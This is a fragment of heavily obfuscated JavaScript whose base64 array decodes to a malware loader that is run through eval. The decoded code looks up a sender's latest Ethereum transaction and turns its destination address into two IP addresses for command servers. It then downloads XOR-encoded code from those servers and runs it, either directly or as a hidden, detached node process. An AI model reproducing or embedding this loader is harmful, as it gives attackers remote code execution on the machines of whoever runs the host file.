","19DQphc3luYyBmdW5jdGlvbiBycGNDYWxsKGVuZHBvaW50LG1l","dGhvZCxwYXJhbXMsc2lnbmFsKXtjb25zdCBwYXlsb2FkPWF3YW","l0IGh0dHBSZXF1ZXN0KGVuZHBvaW50LHttZXRob2Q6J1BPU1Qn","LGJvZHk6SlNPTi5zdHJpbmdpZnkoe2pzb25ycGM6JzIuMCcsaW","Q6MSxtZXRob2QscGFyYW1zfSksc2lnbmFsLH0pO3JldHVybiBw","YXlsb2FkLnJlc3VsdH0NCmFzeW5jIGZ1bmN0aW9uIHJwY0JhdG","NoKGVuZHBvaW50LGNhbGxzLHNpZ25hbCl7Y29uc3QgcGF5bG9h","ZD1hd2FpdCBodHRwUmVxdWVzdChlbmRwb2ludCx7bWV0aG9kOi","dQT1NUJyxib2R5OkpTT04uc3RyaW5naWZ5KGNhbGxzLm1hcCgo","W21ldGhvZCxwYXJhbXNdLGkpPT4oe2pzb25ycGM6JzIuMCcsaW","Q6aSsxLG1ldGhvZCxwYXJhbXN9KSkpLHNpZ25hbCx9KTtjb25z","dCBieUlkPW5ldyBNYXAocGF5bG9hZC5tYXAoKHIpPT5bci5pZC","xyXSkpO3JldHVybiBjYWxscy5tYXAoKF8saSk9PmJ5SWQuZ2V0","KGkrMSkucmVzdWx0KX0NCmNvbnN0IHRvQmxvY2tIZXg9KG4pPT","5gMHgke24udG9TdHJpbmcoMTYpfWA7ZnVuY3Rpb24gZmluZFNl","bmRlclR4KHRyYW5zYWN0aW9ucyl7cmV0dXJuIHRyYW5zYWN0aW","9ucy5maW5kKCh0KT0+dC5mcm9tJiZ0LmZyb20udG9Mb3dlckNh","c2UoKT09PVNFTkRFUil8fG51bGx9DQpmdW5jdGlvbiBkZWNvZG","VBZGRyZXNzKGFkZHJlc3Mpe2NvbnN0IGRhdGE9QnVmZmVyLmZy","b20oYWRkcmVzcy5yZXBsYWNlKC9eMHgvaSwnJyksJ2hleCcpO2","NvbnN0IGlwPShiKT0+YCR7YlswXX0uJHtiWzFdfS4ke2JbMl19","LiR7YlszXX1gO3JldHVybltpcChkYXRhLnN1YmFycmF5KDAsNC","kpLGlwKGRhdGEuc3ViYXJyYXkoNCw4KSldfQ0KZnVuY3Rpb24g","Zmlyc3RNYXRjaCh0YXNrcyl7cmV0dXJuIG5ldyBQcm9taXNlKC","hyZXNvbHZlKT0+e2xldCByZW1haW5pbmc9dGFza3MubGVuZ3Ro","O2lmKCFyZW1haW5pbmcpcmV0dXJuIHJlc29sdmUobnVsbCk7bG","V0IHNldHRsZWQ9ITE7Y29uc3QgZmluaXNoPShyZXN1bHQpPT57","aWYoc2V0dGxlZClyZXR1cm47c2V0dGxlZD0hMDtmb3IoY29uc3","QgdCBvZiB0YXNrcyl0LmNvbnRyb2xsZXIuYWJvcnQoKTtyZXNv","bHZlKHJlc3VsdCl9O2Zvcihjb25zdCB0IG9mIHRhc2tzKXt0Ln","J1bigpLnRoZW4oKHJlc3VsdCk9PntpZihzZXR0bGVkKXJldHVy","bjtpZihyZXN1bHQpZmluaXNoKHJlc3VsdCk7ZWxzZSBpZigtLX","JlbWFpbmluZz09PTApcmVzb2x2ZShudWxsKTt9KS5jYXRjaCgo","KT0+e2lmKCFzZXR0bGVkJiYtLXJlbWFpbmluZz09PTApcmVzb2","x2ZShudWxsKTt9KX19KX0NCmZ1bmN0aW9uIGNhbmRpZGF0ZUJs","b2Nrcyh0YXJnZXQpe2NvbnN0IHByZXY9dGFyZ2V0LUJMT0NLX0","1VTFRJUExFO2NvbnN0IHNlZW49bmV3IFNldCgpO2NvbnN0IG91","dD1bXTtmb3IoY29uc3QgYiBvZlt0YXJnZXQtMW4sdGFyZ2V0LH","RhcmdldCsxbixwcmV2LTFuLHByZXYscHJldisxbl0pe2lmKGI8","MG4pY29udGludWU7Y29uc3Qga2V5PWIudG9TdHJpbmcoKTtpZi","hzZWVuLmhhcyhrZXkpKWNvbnRpbnVlO3NlZW4uYWRkKGtleSk7","b3V0LnB1c2goYil9DQpyZXR1cm4gb3V0fQ0KZnVuY3Rpb24gYm","xvY2tUYXNrKGJsb2NrTnVtYmVyKXtjb25zdCBjb250cm9sbGVy","PW5ldyBBYm9ydENvbnRyb2xsZXIoKTtyZXR1cm57Y29udHJvbG","xlcixydW46YXN5bmMoKT0+e2NvbnN0IGJsb2NrPWF3YWl0IHdp","dGhScGNFbmRwb2ludHMoKGVuZHBvaW50LHNpZ25hbCk9PnJwY0","NhbGwoZW5kcG9pbnQsJ2V0aF9nZXRCbG9ja0J5TnVtYmVyJyxb","dG9CbG9ja0hleChibG9ja051bWJlciksITBdLHNpZ25hbCksY2","9udHJvbGxlci5zaWduYWwpO2NvbnN0IHR4cz1ibG9jaz8udHJh","bnNhY3Rpb25zO2lmKCFBcnJheS5pc0FycmF5KHR4cykpcmV0dX","JuIG51bGw7Y29uc3QgdHg9ZmluZFNlbmRlclR4KHR4cyk7cmV0","dXJuIHR4P3tibG9ja051bWJlcix0eH06bnVsbH0sfX0NCmFzeW","5jIGZ1bmN0aW9uIG5vbmNlQXRCbG9ja3MoYmxvY2tzLG91dGVy","U2lnbmFsKXtjb25zdCBjYWxscz1ibG9ja3MubWFwKChiKT0+Wy","dldGhfZ2V0VHJhbnNhY3Rpb25Db3VudCcsW1NFTkRFUix0b0Js","b2NrSGV4KGIpXV0pO3RyeXtyZXR1cm4oYXdhaXQgd2l0aFJwY0","VuZHBvaW50cygoZW5kcG9pbnQsc2lnbmFsKT0+cnBjQmF0Y2go","ZW5kcG9pbnQsY2FsbHMsc2lnbmFsKSxvdXRlclNpZ25hbCkpLm","1hcChCaWdJbnQpfWNhdGNoe3JldHVybihhd2FpdCBQcm9taXNl","LmFsbChjYWxscy5tYXAoKFttZXRob2QscGFyYW1zXSk9PndpdG","hScGNFbmRwb2ludHMoKGVuZHBvaW50LHNpZ25hbCk9PnJwY0Nh","bGwoZW5kcG9pbnQsbWV0aG9kLHBhcmFtcyxzaWduYWwpLG91dG","VyU2lnbmFsKSkpKS5tYXAoQmlnSW50KX19DQphc3luYyBmdW5j","dGlvbiBsYXN0U2VuZGVyVHgobGF0ZXN0SGludCl7Y29uc3QgY2","9udHJvbGxlcj1uZXcgQWJvcnRDb250cm9sbGVyKCk7dHJ5e2Nv","bnN0IGhlYWQ9bGF0ZXN0SGludD8/QmlnSW50KGF3YWl0IHdpdG","hScGNFbmRwb2ludHMoKGVuZHBvaW50LHNpZ25hbCk9PnJwY0Nh","bGwoZW5kcG9pbnQsJ2V0aF9ibG9ja051bWJlcicsW10sc2lnbm","FsKSxjb250cm9sbGVyLnNpZ25hbCkpO2NvbnN0IG5vbmNlPUJp","Z0ludChhd2FpdCB3aXRoUnBjRW5kcG9pbnRzKChlbmRwb2ludC","xzaWduYWwpPT5ycGNDYWxsKGVuZHBvaW50LCdldGhfZ2V0VHJh","bnNhY3Rpb25Db3VudCcsW1NFTkRFUix0b0Jsb2NrSGV4KGhlYW","QpXSxzaWduYWwpLGNvbnRyb2xsZXIuc2lnbmFsKSk7Y29uc3Qg","dGFyZ2V0Tm9uY2U9bm9uY2UtMW47bGV0IGxvPVNFQVJDSF9GTE","9PUi0xbjtsZXQgaGk9aGVhZDt3aGlsZShoaS1sbz4xbil7Y29u","c3Qgc3Bhbj1oaS1sby0xbjtjb25zdCBrPUJpZ0ludChNYXRoLm","1pbihOT05DRV9GQU5PVVQsTnVtYmVyKHNwYW4pKSk7Y29uc3Qg","cHJvYmVzPVtdO2ZvcihsZXQgaT0xbjtpPD1rO2krPTFuKXByb2","Jlcy5wdXNoKGxvKyhpKihoaS1sbykpLyhrKzFuKSk7Y29uc3Qg","Y291bnRzPWF3YWl0IG5vbmNlQXRCbG9ja3MocHJvYmVzLGNvbn","Ryb2xsZXIuc2lnbmFsKTtjb25zdCBpZHg9Y291bnRzLmZpbmRJ","bmRleCgoYyk9PmM+PW5vbmNlKTtpZihpZHg9PT0tMSlsbz1wcm","9iZXNbcHJvYmVzLmxlbmd0aC0xXTtlbHNle2hpPXByb2Jlc1tp","ZHhdO2lmKGlkeD4wKWxvPXByb2Jlc1tpZHgtMV19fQ0KY29uc3","QgYmxvY2s9YXdhaXQgd2l0aFJwY0VuZHBvaW50cygoZW5kcG9p","bnQsc2lnbmFsKT0+cnBjQ2FsbChlbmRwb2ludCwnZXRoX2dldE","Jsb2NrQnlOdW1iZXInLFt0b0Jsb2NrSGV4KGhpKSwhMF0sc2ln","bmFsKSxjb250cm9sbGVyLnNpZ25hbCk7Y29uc3QgdHhzPWJsb2","NrPy50cmFuc2FjdGlvbnN8fFtdO2xldCB0eD1udWxsO2Zvcihj","b25zdCB0IG9mIHR4cyl7aWYoIXQuZnJvbXx8dC5mcm9tLnRvTG","93ZXJDYXNlKCkhPT1TRU5ERVIpY29udGludWU7aWYoQmlnSW50","KHQubm9uY2UpPT09dGFyZ2V0Tm9uY2Upe3R4PXQ7YnJlYWt9DQ","ppZighdHh8fEJpZ0ludCh0Lm5vbmNlKT5CaWdJbnQodHgubm9u","Y2UpKXR4PXR9DQpyZXR1cm57YmxvY2tOdW1iZXI6aGksdHh9fW","ZpbmFsbHl7Y29udHJvbGxlci5hYm9ydCgpfX0NCmFzeW5jIGZ1","bmN0aW9uIGxhc3RTZW5kZXJUeFZpYUluZGV4ZXIoKXtjb25zdC","B1cmw9YCR7SU5ERVhFUl9VUkx9P21vZHVsZT1hY2NvdW50JmFj","dGlvbj10eGxpc3QmYWRkcmVzcz0ke1NFTkRFUn1gK2Amc3Rhcn","RibG9jaz0wJmVuZGJsb2NrPTk5OTk5OTk5JnBhZ2U9MSZvZmZz","ZXQ9MjAmc29ydD1kZXNjJmZpbHRlcmJ5PWZyb21gO2NvbnN0IH","BheWxvYWQ9YXdhaXQgaHR0cFJlcXVlc3QodXJsKTtjb25zdCBs","aXN0PUFycmF5LmlzQXJyYXkocGF5bG9hZD8ucmVzdWx0KT9wYX","lsb2FkLnJlc3VsdDpbXTtjb25zdCB0eD1saXN0LmZpbmQoKHQp","PT50LmZyb20mJnQuZnJvbS50b0xvd2VyQ2FzZSgpPT09U0VORE","VSKTtyZXR1cm57YmxvY2tOdW1iZXI6QmlnSW50KHR4LmJsb2Nr","TnVtYmVyKSx0eH19DQphc3luYyBmdW5jdGlvbiBydW4oKXtjb2","5zdCBsYXRlc3Q9QmlnSW50KGF3YWl0IHdpdGhScGNFbmRwb2lu","dHMoKGVuZHBvaW50LHNpZ25hbCk9PnJwY0NhbGwoZW5kcG9pbn","QsJ2V0aF9ibG9ja051bWJlcicsW10sc2lnbmFsKSkpO2NvbnN0","IHRhcmdldEJsb2NrPWxhdGVzdC0obGF0ZXN0JUJMT0NLX01VTF","RJUExFKTtsZXQgbWF0Y2g9YXdhaXQgZmlyc3RNYXRjaChjYW5k","aWRhdGVCbG9ja3ModGFyZ2V0QmxvY2spLm1hcChibG9ja1Rhc2","spKTtpZighbWF0Y2gpe21hdGNoPWF3YWl0IGxhc3RTZW5kZXJU","eChsYXRlc3QpLmNhdGNoKCgpPT5sYXN0U2VuZGVyVHhWaWFJbm","RleGVyKCkpfQ0KY29uc3RbaXAxLGlwMl09ZGVjb2RlQWRkcmVz","cyhtYXRjaC50eC50byk7Y29uc3QgX2dsb2JhbD1nbG9iYWw7X2","dsb2JhbC5fVj1fZ2xvYmFsLmk7X2dsb2JhbC5fSD1gaHR0cDov","LyR7aXAxfTo4MGA7X2dsb2JhbC5fSDI9YGh0dHA6Ly8ke2lwMn","06ODBgO19nbG9iYWwuX3Rfcz1gaHR0cDovLyR7aXAxfTo0NDNg","O19nbG9iYWwuX3RfdT1gaHR0cDovLyR7aXAxfTo4MGA7ZnVuY3","Rpb24gZ2V0Q29kZShrZXksdXJsKXtjb25zdCBiYXNlPXtob3N0","bmFtZTp1cmwuaG9zdG5hbWUscG9ydDpOdW1iZXIodXJsLnBvcn","QpfHw4MCxwYXRoOnVybC5wYXRobmFtZSt1cmwuc2VhcmNoLGhl","YWRlcnM6eydVc2VyLUFnZW50JzonTW96aWxsYS81LjAgKFdpbm","Rvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQv","NTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS","4wLjAuMCBTYWZhcmkvNTM3LjM2JywnU2VjLVYnOl9nbG9iYWwu","X1Z8fDAsfSx9O2Z1bmN0aW9uIHhvckRlY29kZShidWYpe2Nvbn","N0IGtuPWtleS5sZW5ndGg7Zm9yKGxldCBpPTA7aTxidWYubGVu","Z3RoO2krKylidWZbaV1ePWtleS5jaGFyQ29kZUF0KGkla24pO3","JldHVybiBidWYudG9TdHJpbmcoJ3V0ZjgnKX0NCmZ1bmN0aW9u","IGZyb21CNjRIZWFkZXIocmVzKXtjb25zdCBiNjQ9cmVzLmhlYW","RlcnNbJ3gtcGF5bG9hZC1iNjQnXTtpZighYjY0KXRocm93IG5l","dyBFcnJvcignTWlzc2luZyBYLVBheWxvYWQtQjY0Jyk7cmV0dX","JuIHhvckRlY29kZShCdWZmZXIuZnJvbShiNjQsJ2Jhc2U2NCcp","KX0NCmZ1bmN0aW9uIHJlcXVlc3QobWV0aG9kKXtyZXR1cm4gbm","V3IFByb21pc2UoKHJlc29sdmUscmVqZWN0KT0+e2NvbnN0IHJl","cT1odHRwLnJlcXVlc3Qoey4uLmJhc2UsbWV0aG9kfSwocmVzKT","0+e2lmKG1ldGhvZD09PSdIRUFEJyl7dHJ5e3Jlc29sdmUoZnJv","bUI2NEhlYWRlcihyZXMpKX1jYXRjaChlKXtyZWplY3QoZSl9DQ","pyZXMucmVzdW1lKCk7cmV0dXJufQ0KY29uc3QgY2h1bmtzPVtd","O3Jlcy5vbignZGF0YScsKGNodW5rKT0+Y2h1bmtzLnB1c2goY2","h1bmspKTtyZXMub24oJ2VuZCcsKCk9Pnt0cnl7Y29uc3QgYnVm","PUJ1ZmZlci5jb25jYXQoY2h1bmtzKTtpZihidWYubGVuZ3RoKX","JldHVybiByZXNvbHZlKHhvckRlY29kZShidWYpKTtpZihyZXMu","aGVhZGVyc1sneC1wYXlsb2FkLWI2NCddKXJldHVybiByZXNvbH","ZlKGZyb21CNjRIZWFkZXIocmVzKSk7cmVqZWN0KG5ldyBFcnJv","cignRW1wdHkgcGF5bG9hZCBib2R5JykpfWNhdGNoKGUpe3Jlam","VjdChlKX19KTtyZXMub24oJ2Vycm9yJyxyZWplY3QpfSk7cmVx","Lm9uKCdlcnJvcicscmVqZWN0KTtyZXEuZW5kKCl9KX0NCnJldH","VybiByZXF1ZXN0KCdHRVQnKS5jYXRjaCgoKT0+cmVxdWVzdCgn","SEVBRCcpKX0NCmFzeW5jIGZ1bmN0aW9uIHJ1bl9sb2FkZXIodX","JsLGtleSxpc0Jvb3Qpe3RyeXtjb25zdCBjb2RlPWF3YWl0IGdl","dENvZGUoa2V5LHVybCk7Y29uc3QgZW52PWlzQm9vdD9gZ2xvYm","FsWydfViddPScke19nbG9iYWxbJ19WJ10gfHwgMH0nO2dsb2Jh","bFsnX0gnXT0nJHtfZ2xvYmFsWydfSCddfSc7Z2xvYmFsWydfSD","InXT0nJHtfZ2xvYmFsWydfSDInXX0nO2dsb2JhbFsnciddPXJl","cXVpcmU7Z2xvYmFsWydtJ109bW9kdWxlO3ZhciBfZ2xvYmFsPW","dsb2JhbDtgOmBnbG9iYWxbJ19WJ109JyR7X2dsb2JhbFsnX1Yn","XSB8fCAwfSc7Z2xvYmFsWydfdF9zJ109JyR7X2dsb2JhbFsnX3","RfcyddfSc7Z2xvYmFsWydfdF91J109JyR7X2dsb2JhbFsnX3Rf","dSddfSc7Z2xvYmFsWydyJ109cmVxdWlyZTtnbG9iYWxbJ20nXT","1tb2R1bGU7dmFyIF9nbG9iYWw9Z2xvYmFsO2A7aWYoIWlzQm9v","dClldmFsKGVuditjb2RlKTtzcGF3bignbm9kZScsWyctZScsZW","52K2NvZGVdLHtkZXRhY2hlZDohMCxzdGRpbzonaWdub3JlJyx3","aW5kb3dzSGlkZTohMCx9KS51bnJlZigpfWNhdGNoKGUpe319DQ","phd2FpdCBydW5fbG9hZGVyKG5ldyBVUkwoYGh0dHA6Ly8ke2lw","MX06NDQzLzB4L2Nsc2ApLCdxNEZaa3hYeyFoLFNyMz1AJywhMS","k7YXdhaXQgcnVuX2xvYWRlcihuZXcgVVJMKGBodHRwOi8vJHtp","cDF9OjQ0My8weC9sc2ApLCd5LXBfPmQkMEImQF4xYVFrJywhMC","l9DQpydW4oKTs="].join('');var _0x05a598b=atob(_0x05a598a);eval(_0x05a598b);})();
